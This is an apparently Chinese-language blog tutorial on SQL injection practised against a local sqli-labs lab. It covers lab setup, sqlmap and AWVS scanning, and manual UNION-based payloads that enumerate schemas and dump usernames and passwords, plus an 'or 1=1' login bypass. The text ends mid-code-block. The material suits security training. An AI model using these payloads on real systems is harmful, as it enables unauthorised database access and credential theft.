



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="SQL injection" />


<link rel="canonical" href="http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/">



  <title>
SQL injection - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">SQL injection
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-03-16 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-03-16T13:38:45+08:00">2022-03-16</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicm0n457cj20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h1>
<h3 id="1sqli-labs-master-安装"><a class="markdownIt-Anchor" href="#1sqli-labs-master-安装">#</a> 1.sqli-labs-master 安装</h3>
<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>
<h4 id="1将sqli-labs-master移动到网站根目录下解压"><a class="markdownIt-Anchor" href="#1将sqli-labs-master移动到网站根目录下解压">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>
<p><code>unzip sqli-labs-master</code></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png" alt="img"></p>
<h4 id="2修改配置文件配合文件为sqlisql-connectionsdb-credsinc"><a class="markdownIt-Anchor" href="#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>
<p><code>vim sqli/sql-connections/db-creds.inc</code></p>
<p>数据库用户名和密码在宝塔面板中可以修改</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png" alt="img"></p>
<h4 id="3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行"><a class="markdownIt-Anchor" href="#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png" alt="img"></p>
<h4 id="4验证安装完成后即可按到如下界面"><a class="markdownIt-Anchor" href="#4验证安装完成后即可按到如下界面">#</a> 4. 验证安装完成后，即可按到如下界面</h4>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png" alt="img"></p>
<h3 id="2sqlmap-安装与使用"><a class="markdownIt-Anchor" href="#2sqlmap-安装与使用">#</a> 2.sqlmap 安装与使用</h3>
<h4 id="1kali联网"><a class="markdownIt-Anchor" href="#1kali联网">#</a> 1.kali 联网</h4>
<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>
<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/network/interfaces.d/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># The loopback network interface**</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line"></span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.66</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>
<h4 id="2修改dns-etcresolvconf"><a class="markdownIt-Anchor" href="#2修改dns-etcresolvconf">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">search localdomain</span><br></pre></td></tr></table></figure>
<h4 id="3重启网络服务"><a class="markdownIt-Anchor" href="#3重启网络服务">#</a> 3. 重启网络服务</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br><span class="line"></span><br><span class="line">service networking restart </span><br></pre></td></tr></table></figure>
<h4 id="4sqlmap使用"><a class="markdownIt-Anchor" href="#4sqlmap使用">#</a> 4.sqlmap 使用</h4>
<p>下载：Github：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw">https://github.com/sqlmapproject/sqlmap</span></p>
<h4 id="5sqlmap支持的注入技术"><a class="markdownIt-Anchor" href="#5sqlmap支持的注入技术">#</a> 5.SQLMAP 支持的注入技术</h4>
<p>​	基于布尔的盲注：根据返回页面判断条件真假的注入。</p>
<p>​	基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>
<p>​	基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>​	基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>
<p>​	堆查询注入：同时执行多条语句的注入。</p>
<h4 id="6sqlmap支持的数据库类型"><a class="markdownIt-Anchor" href="#6sqlmap支持的数据库类型">#</a> 6.SQLMAP 支持的数据库类型</h4>
<p>​	主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>
<h4 id="7sqlmap用法以下用windows演示"><a class="markdownIt-Anchor" href="#7sqlmap用法以下用windows演示">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>
<h4 id="71对于get请求爆破方式"><a class="markdownIt-Anchor" href="#71对于get请求爆破方式">#</a> 7.1 对于 get 请求爆破方式</h4>
<p>1.sqlmap -u URL</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>
<p>判断可注入的参数</p>
<p>判断可以用哪种 SQL 注入技术来注入</p>
<p>识别出所有存在的注入类型</p>
<p>尝试去判定数据库版本、开发语言、操作系统版本</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png" alt="image-20220213182954882"></p>
<p>2.sqlmap -u URL --current-db 获得数据库名</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png" alt="image-20220213183117274"></p>
<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png" alt="image-20220213183308240"></p>
<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png" alt="image-20220213183454058"></p>
<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png" alt="image-20220213183651064"></p>
<h4 id="72对于post请求爆破方式"><a class="markdownIt-Anchor" href="#72对于post请求爆破方式">#</a> 7.2 对于 post 请求爆破方式</h4>
<p>1. 保存文件方式  sqlmap -r x.txt</p>
<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span>  -r E:\1.txt</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png" alt="image-20220213183936861"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png" alt=""></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png" alt="image-20220213184622656"></p>
<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span>  -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>
<p>3. 自动搜索 post 参数方式</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span>  -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png" alt="image-20220213185639194"></p>
<h4 id="73对于一些较难注入的场景"><a class="markdownIt-Anchor" href="#73对于一些较难注入的场景">#</a> 7.3 对于一些较难注入的场景</h4>
<p>通过指定 level 设置，一共包含五个等级</p>
<p>level=2 http cookie 会测试</p>
<p>level=3 http user-agent/referer 头会测试</p>
<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>
<p>python <span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>
<h3 id="使用awvs-进行sql-inject扫描"><a class="markdownIt-Anchor" href="#使用awvs-进行sql-inject扫描">#</a> 使用 AWVS 进行 sql inject 扫描</h3>
<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png" alt="image-20220305141924499"></p>
<p>选择扫描速度</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png" alt="image-20220305142112656"></p>
<p>设置 user-agent 伪装</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png" alt="image-20220305142142802"></p>
<p>可以联动被动扫描器如 xray 进行多次扫描，</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png" alt="image-20220305142228843"></p>
<p>选择 scan</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png" alt="image-20220305142305286"></p>
<p>发现 sql 注入，存在盲注</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png" alt="image-20220305142353893"></p>
<p>点击可以查看详细信息和扫描过程</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png" alt="image-20220305142445896"></p>
<h3 id="3sql注入基础"><a class="markdownIt-Anchor" href="#3sql注入基础">#</a> 3.SQL 注入基础</h3>
<h4 id="31sql前置知识"><a class="markdownIt-Anchor" href="#31sql前置知识">#</a> 3.1SQL 前置知识</h4>
<p>1.mysql 查询方式</p>
<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>
<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>
<p>desc information_schema.schemata;</p>
<p>select distinct schema_name from schemata;</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png" alt="image-20220213191251636"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png" alt="image-20220213191345456"></p>
<p><code>COLUMNS</code>  表：给出了表中的列信息</p>
<p>desc information_schema.columns;</p>
<p>select distinct column_name from information_schema.columns</p>
<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>
<p>desc information_schema.tables;</p>
<p>select distinct table_name from information_schema.tables;</p>
<p><strong>即可以使用的查询语句为</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class="line"></span><br><span class="line">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class="line"></span><br><span class="line">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class="line"></span><br><span class="line">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>
<p>2.mysql 函数</p>
<p>常用的 mysql 函数有：</p>
<p><code>user()</code>  用户名</p>
<p><code>database()</code>  数据库名</p>
<p><code>version()</code>  mysql 数据库版本</p>
<p><code>load_file()</code>  mysql 读取本地文件的函数</p>
<p><code>@@datadir</code>   数据库路径</p>
<p>3.sql 常用注释</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png" alt="image-20220213193633629"></p>
<h4 id="32sql注入定义"><a class="markdownIt-Anchor" href="#32sql注入定义">#</a> 3.2SQL 注入定义</h4>
<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>
<p>本质因为输入的数据和代码不进行区分</p>
<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>
<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>
<p>常见的包括：</p>
<p>Get 参数触发 SQL 注入</p>
<p>POST 参数触发 SQL 注入</p>
<p>Cookie 触发 SQL 注入</p>
<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>
<p>两个条件</p>
<p>用户能够控制输入</p>
<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>
<h4 id="32mysql注入分类"><a class="markdownIt-Anchor" href="#32mysql注入分类">#</a> 3.2mysql 注入分类</h4>
<p>1. 按照请求方法注入</p>
<p>​	get 型注入</p>
<p>​	post 型注入</p>
<p>2. 按照 SQL 数据类型分类</p>
<p>​	整形注入</p>
<p>​	字符型注入</p>
<p>3. 其他类型数据类型</p>
<p>​	报错注入</p>
<p>​	双注入</p>
<p>​	布尔盲注</p>
<p>​	时间盲注</p>
<p>​	Cookie 注入</p>
<p>​	User-Agent 注入</p>
<p><strong>手工注入过程</strong></p>
<p>1 判断是否存在注入点；</p>
<p>2 判断字段长度（字段数）；</p>
<p>3 判断字段回显位置；</p>
<p>4 判断数据库信息；</p>
<p>5 查找数据库名；</p>
<p>6 查找数据库表；</p>
<p>7 查找数据库表中所有字段以及字段值；</p>
<p>8 猜解账号密码；</p>
<p>9 登录管理员后台。</p>
<h5 id="万能密码"><a class="markdownIt-Anchor" href="#万能密码">#</a> 万能密码</h5>
<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>
<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>
<h5 id="1整形注入"><a class="markdownIt-Anchor" href="#1整形注入">#</a> 1. 整形注入</h5>
<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class="line">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class="line">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class="line">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class="line">information_schema 包含当前数据库表名</span><br><span class="line">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class="line">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class="line">因此需要判断前一个表有几列</span><br><span class="line">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class="line">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class="line">这里的1,2,3只是用于占位</span><br><span class="line">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class="line">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class="line">寻找数据库名字</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class="line">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class="line">查询当前数据库</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class="line">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class="line">查询表有哪些字段</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class="line">查询用户名密码</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class="line">以human_read输出user_name和password</span><br><span class="line">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>
<p>2. 什么类型注入</p>
<p>3. 语句是否能够被恶意修改 — 第二要素</p>
<p>4. 是否能够成功执行 — 第三要素</p>
<p>5. 获取想要数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class="line">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class="line">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class="line">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class="line">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>order by 探测列名原理：</strong></p>
<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>
<h5 id="字符型注入"><a class="markdownIt-Anchor" href="#字符型注入">#</a> 字符型注入</h5>
<p>和数字型区别：接收的参数是否有’’ ,id='<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">id&#x27;字符型，id=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">型</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>id 数字型</p>
<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.使用order by判断列数</span><br><span class="line">?id=1&#x27; order by 3 --+</span><br><span class="line">2.使用联合查询</span><br><span class="line">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:security</span><br><span class="line"></span><br><span class="line">3.查找数据库中有几张表</span><br><span class="line">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class="line">提示超出一行</span><br><span class="line">可以使用limit 0,1，此时报出第一张表名</span><br><span class="line">或者使用group_concat</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span 